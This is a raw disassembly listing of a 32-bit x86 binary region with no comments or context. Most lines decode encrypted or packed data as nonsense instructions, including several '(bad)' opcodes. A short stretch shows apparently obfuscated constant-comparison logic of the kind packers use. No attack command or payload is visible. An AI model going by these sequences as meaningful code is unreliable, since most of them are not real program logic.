  41df1a:	sub    bh,BYTE PTR [eax+0x1f90cbf5]
  41df20:	cmp    eax,0x599e7f7c
  41df25:	dec    esp
  41df26:	test   BYTE PTR ds:0xc0921817,cl
  41df2c:	repz jmp 0x6a474ea9
  41df32:	cli    
  41df33:	test   dh,bh
  41df35:	jecxz  0x41defc
  41df37:	adc    BYTE PTR [eax],ah
  41df39:	std    
  41df3a:	in     al,dx
  41df3b:	mov    DWORD PTR [ebx+eiz*4-0x41b31f74],ecx
  41df42:	jno    0x41def9
  41df44:	cmp    BYTE PTR [ecx],al
  41df46:	in     al,0xda
  41df48:	fldenv [ecx-0x399f1f0a]
  41df4e:	lds    edi,FWORD PTR [esi+esi*1]
  41df51:	mov    cl,BYTE PTR [ebp+0x7567e274]
  41df57:	sbb    eax,0x8b7b1b9d
  41df5c:	xchg   ebp,eax
  41df5d:	out    0xda,eax
  41df5f:	test   ebp,0xeae9f604
  41df65:	mov    al,ds:0x23a0d849
  41df6a:	stos   BYTE PTR es:[edi],al
  41df6b:	mov    dl,0x41
  41df6d:	mov    eax,0xc0178cae
  41df72:	and    DWORD PTR [ecx+esi*1+0x4aa22dc],edi
  41df79:	sahf   
  41df7a:	mov    ebp,0x5566da7
  41df7f:	mov    edx,0x867abddc
  41df84:	cmp    al,0x18
  41df86:	xchg   edx,eax
  41df87:	sub    al,0x41
  41df89:	cmp    DWORD PTR [edx-0x5b5bdf10],eax
  41df8f:	xchg   esp,eax
  41df90:	retf   
  41df91:	mov    edi,0xea6f6da0
  41df96:	and    eax,0xc7bad718
  41df9b:	mov    al,BYTE PTR [ebx]
  41df9d:	in     al,dx
  41df9e:	and    ecx,DWORD PTR [edi+edx*4+0x69]
  41dfa2:	push   ebp
  41dfa3:	call   0x2439:0xcd390558
  41dfaa:	inc    esi
  41dfab:	inc    ebx
  41dfac:	lahf   
  41dfad:	and    ah,BYTE PTR [ecx-0x1ef85034]
  41dfb3:	shl    ebp,1
  41dfb5:	jo     0x41dfcc
  41dfb7:	sub    DWORD PTR [ecx+0x30],esi
  41dfba:	jo     0x41df5d
  41dfbc:	mov    edx,0x4bc85749
  41dfc1:	push   0x866d2368
  41dfc6:	mov    eax,0x96a32860
  41dfcb:	rcl    ecx,cl
  41dfcd:	repnz scas al,BYTE PTR es:[edi]
  41dfcf:	pop    ss
  41dfd0:	inc    esi
  41dfd1:	nop
  41dfd2:	push   ebp
  41dfd3:	out    dx,al
  41dfd4:	or     eax,0xfe8e828
  41dfd9:	lds    esp,FWORD PTR [edx+edi*2]
  41dfdc:	sar    BYTE PTR [ebx],0x8a
  41dfdf:	inc    ecx
  41dfe0:	int    0xbe
  41dfe2:	sbb    BYTE PTR [esi],dh
  41dfe4:	sub    al,0xce
  41dfe6:	adc    al,0x1
  41dfe8:	cmc    
  41dfe9:	jle    0x41dfac
  41dfeb:	ret    0x63e0
  41dfee:	adc    eax,0x2c88b1ec
  41dff3:	adc    edx,DWORD PTR [ebp+ebx*8+0x17b50643]
  41dffa:	mov    al,0xc7
  41dffc:	jns    0x41e057
  41dffe:	xor    ah,BYTE PTR [eax+0x65b9908f]
  41e004:	dec    esp
  41e005:	mov    ds:0x63bbdad0,al
  41e00a:	mov    al,BYTE PTR [ebx+0x486f64c8]
  41e010:	pop    ss
  41e011:	pop    ebp
  41e012:	les    eax,FWORD PTR [esi]
  41e014:	neg    DWORD PTR es:[ebp-0x53]
  41e018:	aaa    
  41e019:	mov    ebp,0x57effabd
  41e01e:	xchg   DWORD PTR [edx+0x3b5b9dd8],ebx
  41e024:	push   ebp
  41e025:	ret    
  41e026:	outs   dx,BYTE PTR ds:[esi]
  41e027:	cmp    eax,0x5f3f8e63
  41e02d:	jle    0x41dfdd
  41e02f:	cmovg  esp,esi
  41e032:	mov    WORD PTR [ecx+0x629da51c],es
  41e038:	into   
  41e039:	mov    ah,0x67
  41e03b:	sbb    BYTE PTR [ebx+0x7d],ch
  41e03e:	xor    eax,DWORD PTR [edx-0x34e12045]
  41e044:	out    dx,al
  41e045:	ret    
  41e046:	jns    0x41e03c
  41e048:	mov    eax,ds:0xa9eb2a94
  41e04d:	mov    esi,0x4085c54c
  41e052:	cs in  eax,dx
  41e054:	pop    edx
  41e055:	sti    
  41e056:	sahf   
  41e057:	inc    esp
  41e058:	ss je  0x41e096
  41e05b:	pop    ss
  41e05c:	jno    0x41e06b
  41e05e:	ins    DWORD PTR es:[edi],dx
  41e05f:	cld    
  41e060:	inc    edi
  41e061:	(bad)  
  41e062:	fisubr DWORD PTR [edx]
  41e064:	repz hlt 
  41e066:	xchg   ebp,eax
  41e067:	add    DWORD PTR [ecx],0xa
  41e06a:	add    eax,0xba0d206c
  41e06f:	mov    edx,0x7636f53c
  41e074:	mov    edi,0xc954fc53
  41e079:	imul   edi,esi,0x20
  41e07c:	loop   0x41e0bd
  41e07e:	fistp  QWORD PTR [esi+0x7e896ebe]
  41e084:	jo     0x41e0f1
  41e086:	or     eax,0x5f6a83b
  41e08b:	mov    edx,0x436b5751
  41e090:	push   cs
  41e091:	mov    ds:0x29b28607,eax
  41e096:	dec    ebp
  41e097:	mov    esp,0x368f4c30
  41e09c:	add    BYTE PTR [ebp-0x45],dh
  41e09f:	test   al,0x4a
  41e0a1:	xchg   ebx,eax
  41e0a2:	shl    BYTE PTR [ecx],0xc1
  41e0a5:	add    DWORD PTR [ebx+esi*2+0x62],edx
  41e0a9:	adc    eax,0x89defaa9
  41e0ae:	sysenter 
  41e0b0:	sub    DWORD PTR [esi+0x2b0109ed],0x13
  41e0b7:	push   cs
  41e0b8:	jb     0x41e122
  41e0ba:	repnz fisubr WORD PTR [ebp+0x7f9a21c4]
  41e0c1:	out    dx,eax
  41e0c2:	ret    0xb8f4
  41e0c5:	jne    0x41e103
  41e0c7:	pop    eax
  41e0c8:	arpl   WORD PTR [ebx-0x549cdba0],dx
  41e0ce:	inc    esi
  41e0cf:	pop    ds
  41e0d0:	sub    al,0x69
  41e0d2:	cmc    
  41e0d3:	pop    ss
  41e0d4:	or     al,0x4c
  41e0d6:	pop    fs
  41e0d8:	mov    eax,ds:0x9fc01dab
  41e0dd:	stc    
  41e0de:	mov    eax,ds:0x74a9b626
  41e0e3:	loope  0x41e075
  41e0e5:	clc    
  41e0e6:	adc    esp,ebx
  41e0e8:	(bad)  
  41e0e9:	fmul   DWORD PTR [ebp-0x68420eff]
  41e0ef:	mov    BYTE PTR [ebx+ecx*8+0x361bc768],ah
  41e0f6:	xor    cl,dh
  41e0f8:	loopne 0x41e162
  41e0fa:	nop
  41e0fb:	idiv   ch
  41e0fd:	loope  0x41e108
  41e0ff:	popf   
  41e100:	mov    ah,0xdc
  41e102:	fisubr WORD PTR [ecx+ebp*2]
  41e105:	xor    ah,BYTE PTR [edi]
  41e107:	add    eax,0x9e368c1f
  41e10c:	lds    edx,FWORD PTR [edx+eiz*8]
  41e10f:	and    DWORD PTR [ecx],edx
  41e111:	test   al,0x6c
  41e113:	or     DWORD PTR [eax],eax
  41e115:	inc    edx
  41e116:	and    edi,DWORD PTR [edx+0x102444c7]
  41e11c:	sbb    al,BYTE PTR [edx+0x0]
  41e11f:	add    BYTE PTR [ebx+0x25102444],cl
  41e125:	inc    esp
  41e126:	ret    0xffff
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	xlat   BYTE PTR ds:[ebx]
  41e1f2:	sbb    BYTE PTR [ebx],ch
  41e1f4:	mov    esi,0x18163fc6
  41e1f9:	mov    esp,0xc9181812
  41e1fe:	fsub   QWORD PTR [esi+esi*8+0x39]
  41e202:	jno    0x41e193
  41e204:	push   ds
  41e205:	cmp    esp,DWORD PTR [edx+0x9cacf14]
  41e20b:	and    eax,0x8ab6104d
  41e210:	loope  0x41e217
  41e212:	repnz xor al,0x69
  41e215:	imul   ebp,DWORD PTR [ebp-0x6bb5f921],0xd636473e
  41e21f:	int    0x8c
  41e221:	jmp    0xd6d2c495
  41e226:	jo     0x41e1cc
  41e228:	add    esi,DWORD PTR ds:0xc5c75ef4
  41e22e:	gs mov ah,0x44
  41e231:	fnstcw WORD PTR [ecx+0x23]
  41e234:	lods   al,BYTE PTR ds:[esi]
  41e235:	adc    DWORD PTR [edx+0x4b],esp
  41e238:	sbb    eax,0x6b9f23e2
  41e23d:	outs   dx,BYTE PTR ds:[esi]
  41e23e:	dec    esi
  41e23f:	lods   eax,DWORD PTR ds:[esi]
  41e240:	shl    BYTE PTR [ecx],1
  41e242:	xchg   ebx,eax
  41e243:	(bad)  
  41e244:	stos   DWORD PTR es:[edi],eax
  41e245:	xor    esp,DWORD PTR [edi+0x1a]
  41e248:	hlt    
  41e249:	test   bl,ah
  41e24b:	or     eax,0x7f8ee749
  41e250:	inc    edx
  41e251:	scas   al,BYTE PTR es:[edi]
  41e252:	outs   dx,BYTE PTR ds:[esi]
  41e253:	cmp    eax,0x5b229530
  41e258:	div    BYTE PTR [eax-0x229c30f1]
  41e25e:	mov    DWORD PTR [edi-0x3c],ebp
  41e261:	dec    eax
  41e262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e263:	jmp    0xc88f:0xd845fe94
  41e26a:	jae    0x41e20e
  41e26c:	jns    0x41e2c7
  41e26e:	push   eax
  41e26f:	lock dec edx
  41e271:	ds sub edx,edi
  41e274:	jecxz  0x41e270
  41e276:	sub    eax,0x8a1cde72
  41e27b:	in     al,0x7b
  41e27d:	rcr    BYTE PTR [edi+eiz*8],cl
  41e280:	inc    ebx
  41e281:	pusha  
  41e282:	lods   al,BYTE PTR ds:[esi]
  41e283:	xor    al,0x73
  41e285:	cwde   
  41e286:	pop    ebp
  41e287:	addr16 mov al,ds:0x28b1
  41e28b:	sub    dh,cl
  41e28d:	add    BYTE PTR [edx-0x2a],ah
  41e290:	cdq    
  41e291:	outs   dx,DWORD PTR ds:[esi]
  41e292:	aas    
  41e293:	mov    dl,0xd0
  41e295:	push   ds
  41e296:	cwde   
  41e297:	call   0xbf916b37
  41e29c:	(bad)  
  41e29d:	jnp    0x41e2a8
  41e29f:	mov    ds:0x8176cd2a,al
  41e2a4:	add    BYTE PTR [edi-0x28c35750],cl
  41e2aa:	add    ecx,DWORD PTR [ecx+eax*8-0x5d2152ce]
  41e2b1:	out    dx,eax
  41e2b2:	sahf   
  41e2b3:	push   ss
  41e2b4:	pop    esp
  41e2b5:	pop    eax
  41e2b6:	test   BYTE PTR [ebp-0x2fa17095],bh
  41e2bc:	test   al,0xb6
  41e2be:	xchg   BYTE PTR [edi*4-0x6daa165e],ch
  41e2c5:	or     BYTE PTR fs:[esi+0x31],0xeb
  41e2ca:	stc    
  41e2cb:	scas   eax,DWORD PTR es:[edi]
  41e2cc:	cmp    ebx,DWORD PTR [edi-0x55c3a3]
  41e2d2:	es pop eax
  41e2d4:	pop    eax
  41e2d5:	add    BYTE PTR [ebx-0x33],0xd6
  41e2d9:	dec    esi
  41e2da:	mov    edx,DWORD PTR [eax]
  41e2dc:	add    DWORD PTR [ebp-0xf54014d],ebx
  41e2e2:	jg     0x41e2b8
  41e2e4:	pop    ebx
  41e2e5:	pop    eax
  41e2e6:	cmp    DWORD PTR [edx+esi*4-0x72],0xffffffc9
  41e2eb:	xchg   edi,eax
  41e2ec:	pop    edi
  41e2ed:	jae    0x41e27d
  41e2ef:	into   
  41e2f0:	fucomip st,st(4)
  41e2f2:	jno    0x41e306
  41e2f4:	push   esi
  41e2f5:	inc    esp
  41e2f6:	dec    esi
  41e2f7:	jns    0x41e34a
  41e2f9:	in     eax,0x4c
  41e2fb:	je     0x41e2f9
  41e2fd:	clc    
  41e2fe:	stos   BYTE PTR es:[edi],al
  41e2ff:	or     al,0x7b
  41e301:	push   cs
  41e302:	gs scas eax,DWORD PTR es:[edi]
  41e304:	jmp    0x2eb5:0x1fc95636
  41e30b:	cmp    BYTE PTR [edx-0xfd18000],ch
  41e311:	sti    
  41e312:	sub    ah,bl
  41e314:	xchg   esi,eax
  41e315:	test   DWORD PTR [edi],ebp
  41e317:	sti    
  41e318:	test   dl,bh
  41e31a:	jp     0x41e2f0
  41e31c:	push   edi
  41e31d:	test   BYTE PTR [ebx-0x80],bl
  41e320:	push   esi
  41e321:	fst    DWORD PTR ds:0x4f57954a
  41e327:	rcr    DWORD PTR [esi-0x24a3a703],cl
  41e32d:	xor    al,0xfe
  41e32f:	pusha  
  41e330:	out    0xce,eax
  41e332:	push   0x7041d25f
  41e337:	inc    edx
  41e338:	ins    BYTE PTR es:[edi],dx
  41e339:	xchg   esi,eax
  41e33a:	lock sbb al,0x54
  41e33d:	stc    
  41e33e:	dec    ebp
  41e33f:	inc    ecx
  41e340:	xchg   esi,eax
  41e341:	fwait
  41e342:	mov    ecx,0xec42fd09
  41e347:	pop    esp
  41e348:	fiadd  WORD PTR ds:0xf1bebba2
  41e34e:	aas    
  41e34f:	addr16 pop ebx
  41e351:	in     eax,0x60
  41e353:	call   0x86d2f95c
  41e358:	and    dl,BYTE PTR [edi-0x3ec6db3d]
  41e35e:	(bad)  
  41e35f:	(bad)  
  41e361:	xchg   edi,eax
  41e362:	mov    ds:0xe3b21f1f,al
  41e367:	mov    ds:0xeb01e028,eax
  41e36c:	retf   0x6d79
  41e36f:	add    BYTE PTR [esi],al
  41e371:	sar    DWORD PTR [edi-0x42],0xe3
  41e375:	aad    0xd2
  41e377:	addr16 push ss
  41e379:	std    
  41e37a:	rcr    al,cl
  41e37c:	add    BYTE PTR [esi],0xe5
  41e37f:	fucomi st,st(4)
  41e381:	jbe    0x41e3ff
  41e383:	mov    bh,0x26
  41e385:	cli    
  41e386:	std    
  41e387:	repnz aaa 
  41e389:	mov    ebx,0x4e30c55d
  41e38e:	icebp  
  41e38f:	add    eax,0x7e1bc29a
  41e394:	xchg   ebp,eax
  41e395:	sub    edi,DWORD PTR [ecx-0x48c05440]
  41e39b:	in     eax,dx
  41e39c:	loop   0x41e3c1
  41e39e:	mov    edx,0x79c42d76
  41e3a3:	js     0x41e39f
  41e3a5:	or     DWORD PTR fs:[esi-0x44],0xffffff83
  41e3aa:	add    DWORD PTR [edi+eax*2],edx
  41e3ad:	subps  xmm0,XMMWORD PTR gs:[edx+0x276cec04]
  41e3b5:	sub    eax,0x198b668d
  41e3ba:	xor    edi,edi
  41e3bc:	adc    bl,BYTE PTR [eax]
  41e3be:	jmp    0xd08d:0x9bdd6afc
  41e3c5:	push   eax
  41e3c6:	lock iret 
  41e3c8:	outs   dx,BYTE PTR ds:[esi]
  41e3c9:	hlt    
  41e3ca:	inc    edx
  41e3cb:	mov    esi,0xfdcec34
  41e3d0:	stos   BYTE PTR es:[edi],al
  41e3d1:	mov    ebp,DWORD PTR [ecx]
  41e3d3:	test   BYTE PTR [edi+0x9],bh
  41e3d6:	mov    ah,0x72
  41e3d8:	cdq    
  41e3d9:	clc    
  41e3da:	lea    ebx,[ebx-0x23933840]
  41e3e0:	sti    
  41e3e1:	(bad)  
  41e3e2:	mov    ebp,0xa23804ad
  41e3e7:	enter  0x7730,0xb7
  41e3eb:	and    DWORD PTR [ebp-0x22],0xffffffc6
  41e3ef:	mov    ebp,DWORD PTR [eax+0x42ace50a]
  41e3f5:	aas    
  41e3f6:	imul   eax,DWORD PTR [ebp+esi*4+0x4f],0xca4832ca
  41e3fe:	in     eax,dx
  41e3ff:	xor    eax,0x285f28f8
  41e404:	xchg   ecx,eax
  41e405:	jo     0x41e426
  41e407:	repz mov esi,ds
  41e40a:	xchg   BYTE PTR [edi-0x48],bl
  41e40d:	in     al,dx
  41e40e:	push   esp
  41e40f:	rcr    BYTE PTR ds:0xa65e6a73,cl
  41e415:	mov    cl,0x5d
  41e417:	mov    edx,0x868a7198
  41e41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e41d:	mov    al,0x57
  41e41f:	sbb    ebx,DWORD PTR [ebx]
  41e421:	sti    
  41e422:	mov    ebx,0xc8382
  41e427:	das    
  41e428:	pop    edi
  41e429:	test   al,0x1a
  41e42b:	je     0x41e3e5
  41e42d:	mov    al,ds:0xd8f3f06c
  41e432:	lods   eax,DWORD PTR ds:[esi]
  41e433:	jmp    0x41e454
  41e435:	scas   eax,DWORD PTR es:[edi]
  41e436:	or     cl,BYTE PTR ds:0xa746f6f1
  41e43c:	pop    eax
  41e43d:	inc    ecx
  41e43e:	and    al,0x5d
  41e440:	rol    BYTE PTR [eax-0x44],0x67
  41e444:	and    ch,ah
  41e446:	js     0x41e470
  41e448:	gs cwde 
  41e44a:	cmp    ecx,ebp
  41e44c:	lea    ebp,ds:0xb335529f
  41e452:	jnp    0x41e474
  41e454:	iret   
  41e455:	pop    eax
  41e456:	call   0xcfc11bea
  41e45b:	lahf   
  41e45c:	mov    bl,0x1a
  41e45e:	popa   
  41e45f:	mov    ds:0x74d895ca,eax
  41e464:	push   0x92ec715f
  41e469:	cs inc edi
  41e46b:	(bad)  
  41e46c:	pop    ss
  41e46d:	pop    ss
  41e46e:	mov    ecx,0xd960317
  41e473:	xor    al,0xd8
  41e475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e476:	mov    bl,dh
  41e478:	aad    0x4e
  41e47a:	or     al,0xda
  41e47c:	jo     0x41e46b
  41e47e:	fst    DWORD PTR [esi+0x3f]
  41e481:	stos   DWORD PTR es:[edi],eax
  41e482:	inc    esi
  41e483:	xchg   edi,eax
  41e484:	mov    ebx,0x65a4b796
  41e489:	pop    edi
  41e48a:	mov    esp,0x85ead513
  41e48f:	lahf   
  41e490:	sbb    esi,DWORD PTR [esi]
  41e492:	xchg   ecx,eax
  41e493:	dec    eax
  41e494:	mov    esp,0x1ca56b1e
  41e499:	hlt    
  41e49a:	mov    dl,0x4d
  41e49c:	mov    ch,0x8
  41e49e:	jbe    0x41e4e1
  41e4a0:	or     BYTE PTR [eax+esi*8+0xc],0x42
  41e4a5:	int    0x3d
  41e4a7:	jo     0x41e4bb
  41e4a9:	fnstenv [eax+0x6091a3a4]
  41e4af:	inc    ecx
  41e4b0:	arpl   dx,di
  41e4b2:	sbb    BYTE PTR ds:0xeafa3ffa,dh
  41e4b8:	test   eax,0xd6cceddd
  41e4bd:	sub    al,ch
  41e4bf:	dec    esi
  41e4c0:	lds    esp,FWORD PTR [ebx-0x476082ab]
  41e4c6:	xchg   ecx,eax
  41e4c7:	int    0x52
  41e4c9:	pop    eax
  41e4ca:	fwait
  41e4cb:	adc    al,0x89
  41e4cd:	aas    
  41e4ce:	or     edi,ebx
  41e4d0:	push   ecx
  41e4d1:	imul   ebp,eax,0xf975bc5
  41e4d7:	mov    al,0x48
  41e4d9:	xchg   esi,eax
  41e4da:	mov    eax,esp
  41e4dc:	clc    
  41e4dd:	inc    ecx
  41e4de:	(bad)  
  41e4df:	pop    edi
  41e4e0:	pop    ecx
  41e4e1:	cmp    al,0xc1
  41e4e3:	and    eax,0x9d969a9d
  41e4e8:	aas    
  41e4e9:	into   
  41e4ea:	aam    0xfb
  41e4ec:	arpl   bp,ax
  41e4ee:	es call 0x6fab766c
  41e4f4:	je     0x41e4e1
  41e4f6:	icebp  
  41e4f7:	js     0x41e491
  41e4f9:	inc    esp
  41e4fa:	or     ecx,DWORD PTR [edx+0x36]
  41e4fd:	clc    
  41e4fe:	mov    edx,0x36593c49
  41e503:	es xchg esp,eax
  41e505:	mov    ebx,?
  41e507:	push   ebx
  41e508:	cmc    
  41e509:	dec    ecx
  41e50a:	inc    eax
  41e50b:	mov    ecx,0x5f5f6d2c
  41e510:	enter  0x803c,0x90
  41e514:	cli    
  41e515:	adc    DWORD PTR [edx-0x67183bdd],eax
  41e51b:	mov    edi,0x6c7d4905
  41e520:	dec    edi
  41e521:	pop    esp
  41e522:	add    al,0x25
  41e524:	adc    DWORD PTR [ebx+0x3c],ecx
  41e527:	cmp    al,0x57
  41e529:	jno    0x41e4d5
  41e52b:	xchg   esi,eax
  41e52c:	or     dh,BYTE PTR [edi+0x6b]
  41e52f:	rol    DWORD PTR ds:0xe3c015ed,1
  41e535:	jne    0x41e57a
  41e537:	sbb    cl,cl
  41e539:	adc    DWORD PTR [ebx+0x3e66d2a0],ecx
  41e53f:	sub    DWORD PTR [ebx-0x7671ddd4],ebx
  41e545:	icebp  
  41e546:	int    0x20
  41e548:	aas    
  41e549:	jl     0x41e554
  41e54b:	xchg   edx,eax
  41e54c:	fdiv   st(2),st
  41e54e:	mov    ch,0x6a
  41e550:	xchg   DWORD PTR [edx-0x1c88c4f6],ecx
  41e556:	sbb    al,0x56
  41e558:	pop    es
  41e559:	cmp    edi,DWORD PTR [esi+0x1]
  41e55c:	adc    BYTE PTR [esp+edi*2+0x21],al
  41e560:	arpl   WORD PTR [ecx-0x1c7addf8],dx
  41e566:	stos   DWORD PTR es:[edi],eax
  41e567:	mov    eax,edi
  41e569:	add    DWORD PTR [esi],edx
  41e56b:	je     0x41e4ef
  41e56d:	fxch   st(0)
  41e56f:	or     BYTE PTR [ebp-0x65],dh
  41e572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e573:	push   edx
  41e574:	pop    ebp
  41e575:	xchg   DWORD PTR [edx],ecx
  41e577:	and    BYTE PTR [eax],bh
  41e579:	call   0xe75a44df
  41e57e:	mov    esi,0xd2ef8e77
  41e583:	jno    0x41e601
  41e585:	xchg   ebx,eax
  41e586:	or     al,0xf0
  41e588:	jmp    0x8000:0x383f08a0
  41e58f:	push   edx
  41e590:	scas   al,BYTE PTR es:[edi]
  41e591:	jmp    FWORD PTR [ebp+0x20]
  41e594:	leave  
  41e595:	loope  0x41e58e
  41e597:	ins    BYTE PTR es:[edi],dx
  41e598:	in     al,dx
  41e599:	inc    ebp
  41e59a:	xchg   edi,eax
  41e59b:	pusha  
  41e59c:	mov    al,ds:0x59993eac
  41e5a1:	dec    ebp
  41e5a2:	sub    DWORD PTR [esi-0x2e5e1e4c],0xfb19379
  41e5ac:	cs int 0x23
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xadaae715
  41e5c6:	jmp    0x1816:0x376bbcd5
  41e5cd:	mov    esp,0x31181812
  41e5d2:	xchg   esp,eax
  41e5d3:	add    ecx,esp
  41e5d5:	jne    0x41e621
  41e5d7:	in     al,dx
  41e5d8:	push   ebp
  41e5d9:	int    0x24
  41e5db:	mov    esi,0xa22646d
  41e5e0:	xor    DWORD PTR [ecx+edi*2],0xffffffb6
  41e5e4:	adc    eax,0xbab2bd58
  41e5e9:	mov    ds:0xb61627de,eax
  41e5ee:	sbb    bh,BYTE PTR [edx]
  41e5f0:	adc    bl,BYTE PTR [edi+0x1d]
  41e5f3:	sub    esp,edi
  41e5f5:	pop    ds
  41e5f6:	(bad)  
  41e5f7:	mov    DWORD PTR [ebx-0x2c],edx
  41e5fa:	imul   edx,DWORD PTR [ebp+eax*4+0x51027ca8],0x56
  41e602:	push   esi
  41e603:	(bad)  
  41e604:	loopne 0x41e5c9
  41e606:	mov    ah,0xad
  41e608:	ficomp DWORD PTR [edi-0x12fec8a2]
  41e60e:	scas   al,BYTE PTR es:[edi]
  41e60f:	pop    eax
  41e610:	add    eax,0xb30fb311
  41e615:	mov    esi,0x11d829ed
  41e61a:	cdq    
  41e61b:	loop   0x41e641
  41e61d:	test   DWORD PTR [edi+0x2d],0x8da85ef4
  41e624:	test   BYTE PTR [ecx-0x5e4b8de8],dl
  41e62a:	mov    edx,eax
  41e62c:	shl    DWORD PTR [edi-0x3bfe10c7],cl
  41e632:	and    al,BYTE PTR [esi+0x622e8183]
  41e638:	cmp    DWORD PTR [ebx+ecx*4-0x4b],esi
  41e63c:	retf   0x854f
  41e63f:	(bad)  
  41e640:	addr16 push ecx
  41e642:	or     edx,esi
  41e644:	data16 gs (bad) 
  41e647:	in     eax,0x79
  41e649:	mov    ch,0x7e
  41e64b:	xchg   esp,eax
  41e64c:	sbb    DWORD PTR [edi],ebx
  41e64e:	lods   eax,DWORD PTR ds:[esi]
  41e64f:	leave  
  41e650:	mov    ebp,edi
  41e652:	fwait
  41e653:	pop    ebx
  41e654:	fs jo  0x41e689
  41e657:	jb     0x41e64c
  41e659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e65a:	rol    DWORD PTR [edi],1
  41e65c:	xor    esi,edx
  41e65e:	movq   mm4,mm5
  41e661:	xor    BYTE PTR [esi+0x35dff708],cl
  41e667:	mov    ah,0x85
  41e669:	hlt    
  41e66a:	sub    al,0x11
  41e66c:	pop    ds
  41e66d:	les    ecx,FWORD PTR [esi-0x2f]
  41e670:	test   eax,0x6d17b02
  41e675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e676:	test   eax,0xfa21cde3
  41e67b:	xchg   ecx,eax
  41e67c:	mov    ebp,0x1ab1686
  41e681:	sbb    eax,0xa1414bd5
  41e686:	jecxz  0x41e67d
  41e688:	add    DWORD PTR [edx+0x48],ebx
  41e68b:	scas   eax,DWORD PTR es:[edi]
  41e68c:	dec    ecx
  41e68d:	mov    esi,0x86acc094
  41e692:	xlat   BYTE PTR ds:[ebx]
  41e693:	inc    ebx
  41e694:	loop   0x41e675
  41e696:	stos   DWORD PTR es:[edi],eax
  41e697:	aad    0x2b
  41e699:	adc    DWORD PTR [edx+0x26338db3],esi
  41e69f:	shl    DWORD PTR [edx-0x23ee6ee7],1
  41e6a5:	fwait
  41e6a6:	rcl    DWORD PTR [esi],1
  41e6a8:	jmp    0xa5ee:0xc0091e13
  41e6af:	mov    al,0x99
  41e6b1:	adc    al,0x9b
  41e6b3:	or     ah,BYTE PTR [ebp-0xe989744]
  41e6b9:	out    0x9,al
  41e6bb:	xchg   ebx,eax
  41e6bc:	leave  
  41e6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6be:	sub    eax,0xd674d152
  41e6c3:	mov    ecx,0xa58bb176
  41e6c8:	add    eax,esi
  41e6ca:	xor    BYTE PTR [ebx+0x5774147c],0x74
  41e6d1:	jg     0x41e701
  41e6d3:	loopne 0x41e6e1
  41e6d5:	(bad)  
  41e6d6:	adc    al,dh
  41e6d8:	outs   dx,BYTE PTR ds:[esi]
  41e6d9:	pop    esp
  41e6da:	dec    edx
  41e6db:	fnstcw WORD PTR [edx+ebp*1-0x2ebf8350]
  41e6e2:	retf   0x58e0
  41e6e5:	inc    ecx
  41e6e6:	call   0xdf88:0x113c32a2
  41e6ed:	jo     0x41e6a2
  41e6ef:	inc    edi
  41e6f0:	xchg   esp,eax
  41e6f1:	sub    eax,DWORD PTR [ebp-0x6a4e0e19]
  41e6f7:	mov    BYTE PTR [esi],cl
  41e6f9:	rcr    edx,1
  41e6fb:	dec    DWORD PTR ds:0xa4d37c7c
  41e701:	mov    edx,0xcad3cca9
  41e707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e708:	lock pop esi
  41e70a:	xchg   edx,eax
  41e70b:	fs inc ebx
  41e70d:	or     DWORD PTR [ecx+0x49f4a6d1],esp
  41e713:	add    al,0xc3
  41e715:	cwde   
  41e716:	jno    0x41e753
  41e718:	dec    esp
  41e719:	adc    eax,0x25c5d39a
  41e71e:	push   0xd2cf9164
  41e723:	inc    esp
  41e724:	retf   
  41e725:	repz aaa 
  41e727:	sub    ch,BYTE PTR [edx+0x6dc87ba4]
  41e72d:	lods   al,BYTE PTR ds:[esi]
